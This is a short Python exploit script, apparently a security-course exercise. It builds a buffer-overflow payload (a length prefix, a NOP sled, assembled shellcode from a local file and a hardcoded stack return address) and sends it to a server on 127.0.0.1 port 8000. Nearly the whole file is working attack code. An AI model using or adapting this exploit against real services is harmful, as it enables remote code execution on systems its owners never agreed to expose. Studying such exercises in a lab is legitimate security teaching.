#!/usr/bin/python

import os, socket
import assemble
import struct


HOST        = '127.0.0.1'
SERVER_PORT = 8000
LOCAL_PORT  = 1337


PATH_TO_SHELLCODE = './shellcode.asm'


def get_shellcode():

    trash = assemble.assemble_file(PATH_TO_SHELLCODE)
    return trash


def get_payload():
    '''This function returns the data to send over the socket to the server.
    
    This includes everything - the 4 bytes for size, the nop slide, the
    shellcode and the return address.
    '''
 
    shellCode = get_shellcode()
    size ='\x04\x0F'
    shell_size = len(shellCode)
    numberOfNops = 1040-shell_size
    msg =numberOfNops*'\x90'+ shellCode+"\x04\xde\xff\xbf"

    return struct.pack('>I',len(msg))+msg


def main():
    # WARNING: DON'T EDIT THIS FUNCTION!
    payload = get_payload()
    conn = socket.socket()
    conn.connect((HOST, SERVER_PORT))
    try:
        conn.sendall(payload)
    finally:
        conn.close()


if __name__ == '__main__':
    main()
